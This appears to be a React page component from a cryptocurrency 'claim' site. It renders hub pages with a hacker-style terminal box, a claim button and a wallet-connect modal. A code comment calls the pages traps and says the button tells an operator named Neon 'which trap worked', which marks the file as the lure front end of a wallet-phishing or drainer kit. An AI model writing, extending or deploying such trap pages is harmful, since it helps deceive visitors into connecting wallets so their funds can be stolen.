import { useRoute } from "wouter";
import { motion } from "framer-motion";
import { hubConfig } from "../config/hub-config"; 
import { ClaimButton } from "../components/claim-button";
import { WalletConnectModal } from "../components/wallet-connect-modal";
import { Terminal } from "lucide-react";

export default function HubPage() {
  const [match, params] = useRoute("/hub/:id");
  const hubId = params?.id;

  const currentHub = hubConfig.find((h) => h.id === Number(hubId));

  if (!currentHub) {
    return <div className="h-screen bg-black text-red-500 flex items-center justify-center font-mono">ERROR: HUB_NOT_FOUND</div>;
  }

  return (
    <motion.div 
      initial={{ opacity: 0 }} 
      animate={{ opacity: 1 }}
      className="min-h-screen bg-[#050505] text-white flex flex-col items-center pt-24 px-4 font-sans"
    >
      <div className="text-center max-w-2xl mb-10">
        <h1 className="text-5xl font-bold mb-4 uppercase tracking-tighter" style={{ color: currentHub.color }}>
          {currentHub.title}
        </h1>
        <p className="text-gray-400 text-lg">{currentHub.description}</p>
      </div>

      <div className="w-full max-w-md bg-[#0d0d0d] border border-[#1a1a1a] rounded-xl p-6 shadow-2xl">
        <div className="p-3 mb-6 rounded bg-black/60 border border-[#222] font-mono text-[10px] text-emerald-500/80">
          <p>{'>'} INITIALIZING_PROTOCOL_V2...</p>
          <p>{'>'} TARGET: {currentHub.title.toUpperCase()}</p>
          <p className="animate-pulse text-white">{'>'} AWAITING_WALLET_AUTH...</p>
        </div>
        
        {/* Pass the ID to the button so Neon knows which trap worked */}
        <ClaimButton hubId={Number(hubId)} />
      </div>
      
      <WalletConnectModal />
    </motion.div>
  );
}
